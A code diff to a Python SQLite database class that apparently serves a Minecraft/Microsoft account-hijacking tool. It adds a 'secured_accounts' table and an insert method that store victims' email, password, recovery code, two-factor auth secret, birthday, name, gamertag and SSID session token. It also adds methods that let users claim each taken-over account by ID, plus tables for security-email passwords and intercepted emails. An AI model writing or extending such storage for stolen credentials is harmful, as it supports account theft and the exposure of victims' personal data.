@@ -11,6 +11,56 @@ class DBConnection:
     def __exit__(self, *args) -> None:
         self.conn.close()
 
+    def setupTables(self) -> None:
+        self.cursor.executescript("""
+            CREATE TABLE IF NOT EXISTS `security_emails` (
+                email TEXT,
+                password TEXT
+            );
+
+            CREATE TABLE IF NOT EXISTS `blacklisted_users` (
+                id INTEGER UNIQUE
+            );
+
+            CREATE TABLE IF NOT EXISTS `claimed_accounts` (
+                claim_id TEXT UNIQUE,
+                claimed_by INTEGER
+            );
+
+            CREATE TABLE IF NOT EXISTS `secured_accounts` (
+                claim_id TEXT UNIQUE,
+                claimed_by INTEGER,
+                ms_email TEXT,
+                ms_security_email TEXT,
+                ms_password TEXT,
+                ms_recovery_code TEXT,
+                ms_auth_secret TEXT,
+                ms_first_name TEXT,
+                ms_last_name TEXT,
+                ms_full_name TEXT,
+                ms_region TEXT,
+                ms_birthday TEXT,
+                mc_name TEXT,
+                mc_method TEXT,
+                mc_gamertag TEXT,
+                mc_uchange TEXT,
+                mc_capes TEXT,
+                mc_ssid TEXT,
+                secured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            );
+
+            CREATE TABLE IF NOT EXISTS `received_emails` (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                to_address TEXT,
+                from_address TEXT,
+                subject TEXT,
+                body TEXT,
+                received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                consumed INTEGER DEFAULT 0
+            );
+        """)
+        self.conn.commit()
+
     # Security Emails
     def addSecurityEmail(self, email: str, pwd: str) -> None:
         self.cursor.execute("""
@@ -89,35 +139,41 @@ class DBConnection:
         """, (id,))
         self.conn.commit()
 
-    # Claims
-    def addPendingClaim(self, claim_id: str) -> None:
-        """Insert a claim ID with no owner yet (generated at securing time)."""
+    # Secured Accounts
+    def addSecuredAccount(self, claim_id: str, account: dict) -> None:
+        ms = account["microsoft"]
+        mc = account["minecraft"]
         self.cursor.execute("""
-            INSERT INTO `claimed_accounts` (claim_id, claimed_by)
-            VALUES (?, NULL)
-        """, (claim_id,))
+            INSERT INTO `secured_accounts` (
+                claim_id, claimed_by,
+                ms_email, ms_security_email, ms_password, ms_recovery_code, ms_auth_secret,
+                ms_first_name, ms_last_name, ms_full_name, ms_region, ms_birthday,
+                mc_name, mc_method, mc_gamertag, mc_uchange, mc_capes, mc_ssid
+            ) VALUES (?, NULL, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        """, (
+            claim_id,
+            ms["email"], ms["security_email"], ms["password"], ms["recovery_code"], ms["auth_secret"],
+            ms["firstName"], ms["lastName"], ms["fullName"], ms["region"], ms["birthday"],
+            mc["name"], mc["method"], mc["gamertag"], mc["uchange"], mc["capes"], str(mc["SSID"])
+        ))
         self.conn.commit()
 
     def isValidClaimId(self, claim_id: str) -> bool:
-        """Check if a claim ID exists (was generated during securing)."""
         result = self.cursor.execute("""
-            SELECT 1 FROM `claimed_accounts`
-            WHERE claim_id = ?
+            SELECT 1 FROM `secured_accounts` WHERE claim_id = ?
         """, (claim_id,)).fetchone()
         return result is not None
 
     def isAlreadyClaimed(self, claim_id: str) -> bool:
-        """Check if a valid claim ID has already been claimed by someone."""
         result = self.cursor.execute("""
-            SELECT 1 FROM `claimed_accounts`
+            SELECT 1 FROM `secured_accounts`
             WHERE claim_id = ? AND claimed_by IS NOT NULL
         """, (claim_id,)).fetchone()
         return result is not None
 
     def claimAccount(self, claim_id: str, user_id: int) -> None:
-        """Assign an existing unclaimed ID to a user."""
         self.cursor.execute("""
-            UPDATE `claimed_accounts`
+            UPDATE `secured_accounts`
             SET claimed_by = ?
             WHERE claim_id = ? AND claimed_by IS NULL
         """, (user_id, claim_id))
